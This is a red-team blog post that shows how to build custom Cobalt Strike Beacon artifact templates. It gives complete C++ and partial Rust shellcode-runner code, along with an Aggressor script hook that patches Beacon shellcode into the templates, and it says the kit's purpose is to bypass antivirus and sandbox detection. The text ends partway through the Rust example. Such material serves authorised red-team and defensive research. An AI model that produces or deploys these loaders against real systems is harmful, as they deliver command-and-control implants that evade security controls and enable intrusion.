---
title: Custom Beacon Artifacts
url: https://rastamouse.me/custom-beacon-artifacts/
source: Rasta Mouse
date: 2024-05-08
fetch_date: 2025-10-06T17:22:43.490513
---

# Custom Beacon Artifacts

[Rasta Mouse](https://rastamouse.me)

* [Home](https://rastamouse.me/)

07 May 2024

5 min read

# Custom Beacon Artifacts

If you’re an experienced Cobalt Strike user, you will already know what roll the artifact kit plays in customising its binary (executable and DLL) payload artifacts (artefacts for the British). If not, here’s a tl;dr:

Beacon is a reflective DLL that needs to be loaded into memory to run. When a payload gets generated in Cobalt Strike, the reflective Beacon package gets converted into position independent code and patched into a pre-built template. The artifact itself is only responsible for injecting this Beacon shellcode into memory and creating a new thread to run it. You can therefore just think of these as glorified shellcode runners. They all, with the exception of the service binary, inject the shellcode into themselves using a standard `VirtualAlloc`/`VirtualProtect`/`CreateThread` pattern.

The artifact kit contains the source code (written in C) for the regular executable, service executable, and DLL artifacts. It allows users to change and re-build these templates to bypass antivirus signatures and sandbox technologies. However, you can also wire in custom templates that are not built from this kit – even those written in a different language.

This post will show how to write a simple x64 stageless executable artifact in C++ and Rust. This is not an exhaustive demonstration and should only be taken as a stepping-stone for a more complete solution.

## A Simple C++ Example

Before diving into Rust, I started with C++, based on the original C source code.

```
#include <iostream>
#include <Windows.h>

constexpr auto MIN_STAGE_5K_SIZE = 310272;

typedef struct {
	int  length;
	char shellcode[MIN_STAGE_5K_SIZE];
} Phear;

// pre-allocated memory
char data[sizeof(Phear)] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

int main()
{
	Phear* payload = nullptr;
	void*  ptr     = nullptr;
	HANDLE hThread = nullptr;

	payload = (Phear*)data;

	// printf debugging like a pro
	printf("Length: %d", payload->length);

	// allocate memory
	ptr = VirtualAlloc(
		0,
		payload->length,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	// copy shellcode into memory
	memcpy(ptr, payload->shellcode, payload->length);

	// create a new thread
	hThread = CreateThread(
		nullptr,
		0,
		(LPTHREAD_START_ROUTINE)ptr,
		nullptr,
		0,
		nullptr);

	// don't exit
	WaitForSingleObject(hThread, INFINITE);
}
```

On line 12, I am pre-allocating a char array to be as large as the `Phear` structure. The size of this array will be 310276 bytes in total – 4 bytes for the length and 310272 bytes for the shellcode. The shellcode won’t always be 310272 bytes, depending on the Malleable C2 profile in use, it may be smaller, so the length property is useful to have. The first 1024 bytes of the array are filled with A’s, which act like an egg hunter that we’ll need later.

This ends up in the `.data` section.

![](https://i0.wp.com/rastamouse.me/wp-content/uploads/2024/05/pe-bear-1024x488.png?resize=1024%2C488&ssl=1)

The rest of the code is self-explanatory. When building this executable, it’s helpful to specifically name it `artifact64big.exe`.

## EXECUTABLE\_ARTIFACT\_GENERATOR

The [EXECUTABLE\_ARTIFACT\_GENERATOR](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_hooks.htm#EXECUTABLE_ARTIFACT_GENERATOR) Aggressor hook must be used to provide Cobalt Strike with a custom artifact template when a new payload is generated. Two arguments get passed to this function.

`$1` is the requested artifact file, which can be one of the following:

* artifact32.dll – x86 stager DLL.
* artifact32.exe – x86 stager EXE.
* artifact32big.dll – x86 stageless DLL.
* artifact32big.exe – x86 stageless EXE.
* artifact32svc.exe – x86 stager Service EXE.
* artifact32svcbig.exe – x86 stageless Service EXE.
* artifact64.exe – x64 stager EXE.
* artifact64.x64.dll – x64 stager DLL.
* artifact64big.exe – x64 stageless EXE.
* artifact64big.x64.dll – x64 stageless DLL.
* artifact64svc.exe – x64 stager Service EXE.
* artifact64svcbig.exe – x64 stageless Service EXE.

Using this naming convention with your custom artifacts makes it easier to grab the correct one.

`$2` is the Beacon shellcode to embed.

The first step is to read the custom template from disk. If the path is not found, returning `$null` will tell Cobalt Strike to use the default template instead.

```
set EXECUTABLE_ARTIFACT_GENERATOR {
    local('$path $handle $template');

    # get matching artefact path
    $path = getFileProper("C:\\Artefacts", $1);

    # return null if we don't have a custom one
    if (!-exists $path) {
      println("Could not find custom " . $1);
      return $null;
   }

   # read in the template file
   $handle = openf($path);
   $template = readb($handle, -1);
   closef($handle);
}
```

Once the artifact has been read, the next step is to find the `data` array by searching for the A x 1024 placeholder.

```
# get the location of data array
$index = indexOf($template, 'A' x 1024);
println("A's start @ " . $index);
```

Once found, we need to patch in the data according to the `Phear` struct. First, create a local buffer and write both the shellcode length, and the shellcode into it.

```
# local buffer
$buffer = allocate(1024);

# calculate length and pack into buffer
$length = strlen($2);
println("Shellcode length is " . $length);

writeb($buffer, pack("i-", $length));

# pack shellcode into buffer
for ($i = 0; $i < $length; $i++) {
    writeb($buffer, chr((byteAt($2, $i))));
}
```

The buffer should then be closed for writing and its content read back into a new variable.

```
# close buffer for writing
closef($buffer);

# read its content back
$b = readb($buffer, -1);
```

The final step is then to overwrite the data at `$index` (where the A’s start) with the content of `$b`.

```
# return modified template
return replaceAt($template, $b, $index);
```

With any luck, a new Beacon will appear when executing the generated payload.

![](https://i0.wp.com/rastamouse.me/wp-content/uploads/2024/05/cpp-beacon-1024x289.png?resize=1024%2C289&ssl=1)

## Rust

The process for getting this working in Rust is not all that different, you don’t even have to change the Aggressor code.

```
use std::ffi::c_void;
use std::mem::{size_of, transmute};
use std::ptr::{copy, null, null_mut};
use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAlloc};
use windows_sys::Win32::System::Threading::{CreateThread, INFINITE, WaitForSingleObject};

const MIN_STAGE_5K_SIZE: usize = 310272;

#[repr(C)]
struct Phear {
    length: u32,
    payload: [u8; MIN_STAGE_5K_SIZE]
}

#[link_section = ".data"]
static DATA: [u8; size_of::<Phear>()] = [0x41; size_of::<Phear>()];

fn main() {
    unsafe {
        let phear = DATA.as_ptr() as *const Phear;

        let len = (*phear).length;
        let payload = (*phear).payload;

        println!("Length...